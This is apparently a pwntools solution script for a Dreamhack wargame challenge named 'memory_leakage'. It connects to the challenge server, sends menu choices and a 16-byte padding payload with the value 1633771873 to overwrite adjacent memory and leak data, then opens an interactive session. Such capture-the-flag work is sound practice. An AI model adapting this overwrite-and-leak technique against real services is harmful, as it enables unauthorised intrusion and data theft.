from pwn import*

#p = process("./memory_leakage")
p = remote("host3.dreamhack.games", 9009)
#gdb.attach(p,api=True)

p.sendline(b"3")

p.sendline(b"1")

payload = b"a"*0x10
p.sendline(payload)

payload = b"1633771873"
p.sendline(payload)

p.sendline(b"2")
p.sendline(b"a"*0x10)
p.interactive()
